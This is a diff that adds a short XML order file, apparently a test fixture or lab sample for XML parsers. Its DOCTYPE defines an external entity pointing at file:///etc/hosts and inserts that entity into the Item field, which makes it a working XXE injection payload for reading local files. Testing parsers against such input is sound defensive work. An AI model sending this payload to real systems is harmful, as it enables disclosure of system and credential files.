@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/hosts" >]>
+<Order>
+  <order order_num="4">
+    <Name>Brandon</Name>
+    <Address>123 Ashley avenue</Address>
+    <Email>BrandonRocks@email.com</Email>
+    <Item>&xxe;</Item>
+  </order>
+</Order>
